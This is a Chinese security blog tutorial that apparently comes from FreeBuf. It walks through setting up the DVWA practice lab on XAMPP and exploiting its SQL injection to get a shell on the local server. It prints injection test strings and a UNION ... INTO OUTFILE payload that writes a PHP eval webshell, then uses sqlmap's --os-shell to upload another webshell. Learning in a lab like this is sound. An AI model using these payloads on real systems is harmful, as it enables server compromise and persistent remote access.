***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

##  **引言** ****

>
> 一转眼从刚开始看关于安全的基础书籍到现在已经十个月的时间了，对渗透测试的兴趣也不断的增加，由于刚开始工作的需求，只来得及看一些常见漏洞的基本原理就开始跟随老师傅开始渗透测试的工作。现在还记得第一次自己发现
> xss激动的心情，师傅领进门，学习到了很多知识，后来因为工作原因到了安服务项目上去，三月粗糙的渗透测试能力不足以支撑在项目上有很好的实践，而且由于项目经过其他渗透测试人员千百遍的洗礼比较严重的漏洞也不在外面做项目那么常见。
>
>
> 有一天之前带我的师傅说给你网站，帮忙做下渗透，于是我经过一番测试，发现了暴力破解，还有一些验证绕过的逻辑漏洞，匆匆写了报告交差，师傅一顿夸之后说他自己通过注入getshell了一个同C段的网站，我说我C段扫描时候并没有发现这个IP啊（挫败感之下的借口），然后我说我如果能发现这个系统应该也能getshell，师傅的一句话有点触及到我的那啥（你估计应该不会通过mysql注入getshell）。

**是啊，在项目上的系统每周每个月经过几十遍的过滤，平时看到提交参数的地方也就sqlmap跑一跑，对于最基础的手工注入都没有扎实的学会，于是我决定要知道如何搭建环境并学会如何通过
mysql 到 getshell。**

通过查资料，总结出了这篇文章，把自己心路历程写出来分享给初学者也希望能得到大牛的指正，希望入门级玩家能共勉，自己多创建学习的环境，多思考。

##  **搭建环境** ****

在刚开始学习的时候，就是通过搭建DVWA学习各种漏洞，sql注入，xss，文件上传等等，所以在想到如何搭建一个存在注入的环境时候，脑海中立刻有了这个想法，我们看到的教程往往只会介绍如何通过高中低的安全级别进行漏洞的复现，那为什么不可以通过注入进行getshell呢，所以我立刻搭建了环境准备尝试一下。

 **STEP 1** 准备好需要的文件，在网上都可以免费下载的到

> 1）Xampp集成环境
>
> 2）Dvwa压缩包

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534751849_5b7a7469a5893.png!small)

 **STEP 2**
点击安装并启动xampp，其中可能在开启apache时会出现错误，此时需要通过修改config文件把端口改成未占用的端口即可，我这里就改为4433
与8081。

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534751861_5b7a7475564de.png!small)

把dvwa解压并放到xampp目录下的htdoc目录下

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534751897_5b7a7499d2400.png!small)

 **STEP 3** 此时环境已经搭建完毕，访问登陆，就可以看到各种各样的漏洞环境。

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534751889_5b7a749162866.png!small)

 **参考** **：** 站内及网上有关于搭建环境的详细介绍，如按照上述步骤不能搭建成功，可自行搜索解决问题。

 **链接：**<http://www.freebuf.com/sectool/102661.html>

##  **漏洞利用—— 手工** **篇** ****

手工注入到getshell思路：

> 1）判断是否有注入，注入是字符型还是数字型；
>
>
> 2）然后利用sql语句来进行操作磁盘文件（mysql数据库读取磁盘文件是非常简单的，因为mysql提供了load_file()等函数，如果把数据库与网站装在同服务器上，就很容易被写入webshell）。

###  **漏洞利用** ****

 **STEP 1输入1，查询成功** ****

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534751910_5b7a74a6904bb.png!small)

输入1'and '1 '='2，查询失败，返回为空

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534751918_5b7a74aec5215.png!small)

输入1'or '1234 '='1234，查询成功，说明存在注入

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534751929_5b7a74b9c0d3b.png!small)

我们通过查看源代码功能，看一下在low级别中是如何进行数据库查询的

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534751939_5b7a74c30c605.png!small)

我们把我们刚才注入成功的语句拼接到sql查询语句中进行分析

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534751954_5b7a74d24f1b0.png!small)原理其实很简单，就是通过一个条件语句判断，如果where后面的条件语句为真，就可以进行查询，如果条件判断为假，就为错，不返回任何结果。在高中我们学习条件语句的时候就知道在进行or运算的时的规则：  
![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534751995_5b7a74fbdc155.png!small)

**STEP 2** **SQL语句只union查询** ****

大多数的SQL查询只包含从一个或多个表中返回数据的单条SELECT语句（比如说我们在id处输入1，就会返回一个结果），但是SQL也允许执行多个查询(多条SELECT语句),并将结果作为一个查询结果集返回。这些组合查询通常称为并或复合查询，一般常见的数据库有都支持UNION查询，使用UNION很简单，所要做的只是给出每条SELECT语句，然后再每条SELECT语句之间加上UNION关键字,这样所给出的SELECT结果集就能组合成一个结果集并返回。

###  **举例说明** ****

1）我们在id处输入1 ，返回一个结果

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752005_5b7a75059017c.png!small)

2）在id处输入1' union select 1,2'，可以看出，我们在数据库中执行了两次select查询

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752013_5b7a750de3b40.png!small)

并同时返回了两个结果

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752021_5b7a7515a5ac6.png!small)

 **STEP 3 利用** **union** **查询执行** **mysql** **所带有的函数，对磁盘文件进行操作** ****

1）我们输入1' union select 1,' <?php @eval($_POST['pass']) ?>' into outfile
'C:/xampp/htdocs/dvwa/1.php' # 使用into outfile 写入一句话木马，文件名为1.php，发现报错了，查找原因。

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752031_5b7a751f2f03f.png!small)

2）通过报错信息可以看到应该说是单引号闭合的问题，因为前段时间在学python，所以决定把一句话木马里的单引号改成双引号试一试

1' union select 1,'<?php @eval($_POST["pass"]) ?>' into outfile
'C:/xampp/htdocs/dvwa/1.php' #
（刚才开始不知道sql语句中单引号里要用双引号，简直折磨啊，各种用单引号进行闭合，各种报错，各种头铁尝试，我甚至以为是不是我没有权限进行写入文件，错误的怀疑人生。）

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752040_5b7a7528048b4.png!small)

3）没有报错信息了，成功了？查看目录，果然有了1.php文件，赶紧上菜刀（舒服啊，虽然没有真实环境那么开心，但是毕竟也算是利用成功了）

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752057_5b7a7539da238.png!small)

手工测试到这里就结束了，像我这种工具狗，肯定想办法用工具来解决。

##  **漏洞利用—— 工具篇** ****

最常见的利用发现sql注入的方式就是sqlmap了，做渗透测试的人手一本，知道存在sql注入，上来就拿过来跑一跑

 **STEP1 :发现注入，并且实现** ****

URL:[http://127.0.0.1:8081/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#,](http://127.0.0.1:8081/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#,)哇X，结果竟然失败了，通过下图的sqlmap中报的302信息中可以看到在进行测试时是跳转到了登陆界面，原来用sqlmap测试是需要登陆的。

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752067_5b7a7543534ee.png!small)![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752074_5b7a754a3e5fd.png!small)

一番操作，知道要添加cookie进行测试，成功啦。

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752082_5b7a755292289.png!small)![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752097_5b7a7561689ca.png!small)

 **STEP 2** **：** 利用sqlmap中os-shell 参数继续进行攻击（–os-shell
也就是从注入点获得一个交互式的shell，给我们提供了一个环境可以执行一定的系统命令，讲白了也就是类似于在windows下的cmd）。

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752129_5b7a7581ae96f.png!small)![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752133_5b7a7585b3cab.png!small)

 **STEP 3** **：**
根据具体系统的环境来选择语言，Dvwa用的是php，自然就选择php，然后选择2自定义上传位置。此处想要获得shell，就必须知道网站的绝对路径。（C:\xampp\htdocs\dvwa中的路径分隔符\在windows下需要在加上\进行转译）。

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752143_5b7a758ff31f1.png!small)

 **STEP 4** ：可以看到获得了os-shell，并且在网站目录下上传了两个php格式的文件，我们对这两个文件进行访问，可看到给我们提供了上传点，通过上传点进行木马文件的上传。

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752149_5b7a7595afcad.png!small)

 **STEP 5** **：** ****
利用此上传点上传2.php，内容为php一句话木马（熟悉php的可以自己写，不熟悉的可以百度），然后通过菜刀进行连接，获得shell。

![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752158_5b7a759e5bbe5.png!small)![搭建dvwa环境学习从MySql注入到GetShell](https://image.3001.net/images/20180820/1534752165_5b7a75a53b065.png!small)

##  **总结** ****

自己的学习探索过程远远不止这些，因为在搭建环境包括在利用漏洞的时候都会出现各种各样的问题，都需要通过不断的探索去解决，比如说在手工进行注入的时候甚至因为单引号是中文的还是英文的吃过亏，还有如何进行单引号闭合，进行sqlmap进行攻击的时候需要添加cookie，在获得os-shell时候需要加反斜杠进行转译等等...，一次一次的错误，一次一次的解决，不放弃静下心来解决问题，学习的过程就是如此，包括平时的渗透也是如此，需要耐下心来慢慢的摸索，在摸索的过程中不断提升自己的技术，不断的成长，毕竟大牛也不是一天练成的。

##  **缺点** ****

> 1）环境为搭建的环境，权限较高，也没有防火墙、waf等安全设备的防护，不会出现被拦截等情况，真实的环境往往需要躲过一重又一重的防护。
>
> 2）文章中未涉及linux下的攻击利用方式，因为os-> shell一直是一个吐槽的点，这需要注入点有多大的权限啊，有这个权限，我还需要这个操作么之类的？其中在linux就因为权限的问题没有解决，所以没有利用成功，同时看了大牛的文章什么监听反弹shell之类的也是有点懵的。

所以希望新手看到这篇文章后，可以自己去装虚拟机去尝试。并不是说能学到多少内容，更重要的还是总结出自己平时学习的思路，自己给自己创造环境，多用虚拟机，见识多了自然懂的就多了，也希望大牛看到了能多提意见，给新手成长的空间与机会。

 ***本文作者：zhengpengfei，转载请注明来自 FreeBuf.COM**

